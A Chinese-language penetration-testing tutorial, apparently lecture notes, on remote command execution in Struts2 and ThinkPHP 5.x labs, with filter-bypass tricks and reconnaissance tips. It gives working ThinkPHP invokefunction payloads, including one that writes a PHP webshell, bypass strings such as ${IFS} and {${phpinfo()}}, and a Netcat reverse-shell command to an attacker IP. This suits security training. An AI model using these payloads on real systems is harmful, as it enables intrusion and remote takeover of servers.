### 环境部署与访问

![](img/355bc48937ea231b6a2d7ab3f7248778_31.png)

首先，我们需要搭建漏洞实验环境。Struts2是一个Java Web应用框架，其某些版本存在远程命令执行漏洞。

![](img/355bc48937ea231b6a2d7ab3f7248778_33.png)

以下是部署步骤：

![](img/355bc48937ea231b6a2d7ab3f7248778_41.png)

1.  下载漏洞环境所需的WAR包。
2.  将WAR包放置于Tomcat服务器的`webapps`目录下。
3.  启动Tomcat服务，Tomcat会自动解压WAR包。
4.  通过浏览器访问部署的应用，默认地址通常为 `http://靶机IP:8080/应用名`。

![](img/355bc48937ea231b6a2d7ab3f7248778_43.png)

**注意**：访问时需注意URL路径。若指导书中的示例URL多了一个表示目录的`/`，可能导致后续功能（如点击编辑按钮）访问失败，需要手动修正URL。

### 漏洞利用过程

环境部署成功后，即可进行漏洞利用。Struts2漏洞的利用通常通过发送一个包含恶意代码的HTTP请求来实现。

以下是利用步骤：

1.  使用Burp Suite等工具拦截对目标页面的正常请求。
2.  将准备好的漏洞利用代码（POC）作为请求的一部分发送。POC本质是一段能执行系统命令的Java代码。
3.  观察服务器响应，若命令执行成功，可能会在服务器上弹出计算器或执行其他指定命令。

![](img/355bc48937ea231b6a2d7ab3f7248778_49.png)

例如，一个简单的POC可能包含如下代码片段，用于执行`calc`命令弹出计算器：
```java
Runtime.getRuntime().exec("calc");
```
我们可以修改其中的命令字符串，来执行其他系统指令，如`ipconfig`。

![](img/355bc48937ea231b6a2d7ab3f7248778_51.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_53.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_55.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_56.png)

**核心思路**：该漏洞利用了Struts2框架在处理特定输入时的缺陷，使得攻击者注入的OGNL表达式能被解析并执行。

### 漏洞原理浅析

ThinkPHP 5.x 版本的远程命令执行漏洞，源于框架对请求变量的处理不当。攻击者可以构造特殊的请求，使应用程序将输入作为PHP代码执行。

关键函数是 `call_user_func_array()`，它的作用是将第一个参数作为回调函数调用，并将数组参数传递给该回调函数。
```php
call_user_func_array($function, $param_array);
```
如果攻击者能够控制 `$function` 和 `$param_array`，例如将其设置为 `system` 和 `whoami`，那么就会执行系统命令 `whoami`。

### 漏洞利用演示

![](img/355bc48937ea231b6a2d7ab3f7248778_74.png)

我们以ThinkPHP 5.0版本为例进行演示。

1.  **探测漏洞**：访问特定URL路径，如 `/index.php?s=/index/\think\app/invokefunction`。
2.  **执行命令**：通过GET或POST方式传递参数，构造Payload。例如，执行 `whoami` 命令的Payload可能如下：
    ```
    function=call_user_func_array&vars[0]=system&vars[1]=whoami
    ```
    发送请求后，页面会返回命令执行的结果（当前服务器用户名）。
3.  **写入WebShell**：进一步利用，可以写入一个PHP后门文件。使用 `file_put_contents` 函数：
    ```
    function=call_user_func_array&vars[0]=file_put_contents&vars[1]=shell.php&vars[2]=<?php @eval($_POST[‘cmd’]);?>
    ```
    此Payload会在网站根目录生成一个名为 `shell.php` 的WebShell，密码为 `cmd`。

**重要区别**：在利用 `call_user_func_array` 执行 `system` 等函数时，传递的是**函数名和参数**。而在利用 `eval` 或 `assert` 执行PHP代码时，传递的是**完整的代码字符串**，且需要以分号结尾。

## 命令执行绕过技巧

![](img/355bc48937ea231b6a2d7ab3f7248778_76.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_78.png)

在实际渗透测试中，应用程序往往会对输入进行过滤。上一节我们看到了直接的利用方式，本节中我们来看看如何绕过一些简单的过滤。

### 大小写转换绕过

![](img/355bc48937ea231b6a2d7ab3f7248778_80.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_82.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_83.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_84.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_85.png)

考虑以下存在漏洞的代码片段，它在执行前将输入字符串转换为大写：
```php
$data = $_GET[‘data‘];
$data = strtoupper($data); // 转换为大写
preg_replace(‘/(.*)/e‘, ‘\\1‘, $data);
```
如果直接传入 `phpinfo()`，经过 `strtoupper` 后会变成 `PHPINFO()`，而PHP中函数名是大小写不敏感的，但代码字符串中的 `PHPINFO()` 不会被正确执行。

![](img/355bc48937ea231b6a2d7ab3f7248778_87.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_89.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_91.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_93.png)

**绕过方法**：利用PHP双引号字符串的特性。在双引号中，变量会被解析。我们可以构造如下Payload：
```
“{${phpinfo()}}”
```
当 `$data` 被赋值为此字符串后，PHP解释器会先解析双引号内的变量 `{${phpinfo()}}`，从而执行 `phpinfo()` 函数，即使之后被转换成大写，也不影响已执行的结果。

![](img/355bc48937ea231b6a2d7ab3f7248778_95.png)

### 其他常见绕过思路

![](img/355bc48937ea231b6a2d7ab3f7248778_97.png)

以下是其他一些可能遇到的过滤及绕过思路：

![](img/355bc48937ea231b6a2d7ab3f7248778_99.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_101.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_103.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_104.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_106.png)

*   **过滤空格**：使用`${IFS}`、`$IFS$9`、`<`、`>`、`%09`（制表符）等代替。
*   **过滤分号**：在某些上下文中，可以使用 `?>` 来闭合PHP标签，或者利用反引号执行命令无需分号。
*   **过滤关键字**：使用拼接、编码、通配符等方式。例如，`system(‘whoami‘)` 可以尝试用 `(sy.(st).em)(‘whoami‘)` 或使用 `base64_decode` 解码后执行。

### Netcat (NC) 的使用

Netcat是网络工具中的“瑞士军刀”，在命令执行漏洞利用中常用于获取反向Shell。

![](img/355bc48937ea231b6a2d7ab3f7248778_122.png)

![](img/355bc48937ea231b6a2d7ab3f7248778_124.png)

*   **监听端口（攻击机）**：`nc -lvnp 4444`
*   **反向连接（靶机利用命令执行）**：`nc -e /bin/bash 攻击机IP 4444`
    *   此命令会让靶机主动连接到攻击机的4444端口，并绑定一个bash shell。
*   **注意**：Windows和Linux上的nc参数可能不同，且某些版本的nc可能不支持 `-e` 参数。

![](img/355bc48937ea231b6a2d7ab3f7248778_126.png)

### 指纹识别与信息收集

在测试未知目标时，识别其使用的框架、组件版本至关重要。这有助于快速寻找已知漏洞。

*   **在线工具**：使用如 `whatweb`、`Wappalyzer` 等工具或浏览器插件。
*   **手动观察**：查看HTTP响应头、特定文件（如 `robots.txt`）、默认路径、页面版权信息等。
*   **目录扫描**：使用 `dirsearch`、`御剑` 等工具扫描常见目录，可能发现框架特征文件。
